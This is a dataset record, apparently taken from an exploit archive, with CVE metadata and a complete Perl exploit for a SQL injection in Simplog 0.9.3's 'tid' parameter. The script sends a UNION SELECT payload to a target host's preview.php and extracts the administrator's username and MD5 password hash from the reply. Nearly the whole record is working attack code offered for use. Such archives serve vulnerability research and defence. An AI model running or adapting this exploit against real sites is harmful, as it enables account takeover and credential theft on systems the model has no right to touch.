{
  "id": "1705",
  "title": "Simplog 0.9.3 - &#039;tid&#039; SQL Injection",
  "cve": "CVE-2006-2029",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=25\r\n#Usage: simplog.pl <host> <path>\r\nuse IO::Socket;\r\nif(@ARGV != 2) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-25\\r\\n\";\r\n  print \"- Simplog <= 0.93 Remote SQL Injection Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to Simplog ex: /simplog/\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $spserver = $ARGV[0];\r\n  $spserver =~ s/(http:\\/\\/)//eg;\r\n  $sphost   = \"http://\".$spserver;\r\n  $spdir    = $ARGV[1];\r\n  $spport   = \"80\";\r\n  $sptar    = \"preview.php?adm=tem&blogid=1&tid=\";\r\n  $spxp     = \"-1/**/UNION/**/SELECT/**/concat(25552,login,25553,password,25554)/**/from/**/blog_users/**/where/**/admin=1/*\";\r\n  $spreq    = $sphost.$spdir.$sptar.$spxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $spserver\\r\\n\";\r\n  $sp = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$spserver\", PeerPort => \"$spport\") || die \"- Connection failed...\\n\";\r\n  print $sp \"GET $spreq HTTP/1.1\\n\";\r\n  print $sp \"Accept: */*\\n\";\r\n  print $sp \"Referer: $sphost\\n\";\r\n  print $sp \"Accept-Language: tr\\n\";\r\n  print $sp \"User-Agent: NukeZilla\\n\";\r\n  print $sp \"Cache-Control: no-cache\\n\";\r\n  print $sp \"Host: $spserver\\n\";\r\n  print $sp \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$sp>) {\r\n    if ($answer =~ /25552(.*?)25553([\\d,a-f]{32})25554/) {\r\n      print \"- Exploit succeed!\\r\\n\";\r\n      print \"- Username: $1\\r\\n\";\r\n      print \"- MD5 HASH of PASSWORD: $2\\r\\n\";\r\n      exit();\r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# nukedx.com [2006-04-21]\r\n\r\n# milw0rm.com [2006-04-21]",
  "url": "https://www.exploit-db.com/exploits/1705"
}